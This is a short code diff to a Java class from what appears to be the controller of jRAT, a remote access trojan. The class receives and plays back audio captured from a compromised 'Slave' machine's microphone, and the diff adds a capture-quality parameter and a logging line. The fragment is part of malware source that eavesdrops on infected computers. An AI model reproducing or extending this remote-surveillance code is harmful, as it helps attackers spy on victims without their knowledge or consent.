@@ -7,13 +7,15 @@ import javax.sound.sampled.AudioSystem;
 import javax.sound.sampled.DataLine;
 import javax.sound.sampled.SourceDataLine;
 
+import se.jrat.common.Sound;
 import se.jrat.controller.Slave;
 import se.jrat.controller.ui.dialogs.DialogRemoteSoundCapture;
+
+import com.redpois0n.graphs.utils.DataUnits;
 
 
 public class Packet58ServerDownloadSoundCapture extends AbstractIncomingPacket {
 
-	public static final AudioFormat format = new AudioFormat(AudioFormat.Encoding.PCM_SIGNED, 44100, 16, 2, 4, 44100, false);
 	private static DataLine.Info info;
 	private static SourceDataLine line;
 
@@ -21,8 +23,12 @@ public class Packet58ServerDownloadSoundCapture extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		DialogRemoteSoundCapture frame = DialogRemoteSoundCapture.instances.get(slave);
+		int quality = dis.readInt();
+		
+		DialogRemoteSoundCapture frame = DialogRemoteSoundCapture.INSTANCES.get(slave);
 		if (!initialized) {
+			AudioFormat format = Sound.getFormat(quality);
+			
 			info = new DataLine.Info(SourceDataLine.class, format);
 			if (!AudioSystem.isLineSupported(info)) {
 				throw new Exception("Sound line is not supported");
@@ -34,6 +40,7 @@ public class Packet58ServerDownloadSoundCapture extends AbstractIncomingPacket {
 		}
 
 		int size = slave.readInt();
+		System.out.println("Reading sound: " + DataUnits.getAsString(size));
 
 		byte[] data = new byte[size];
 
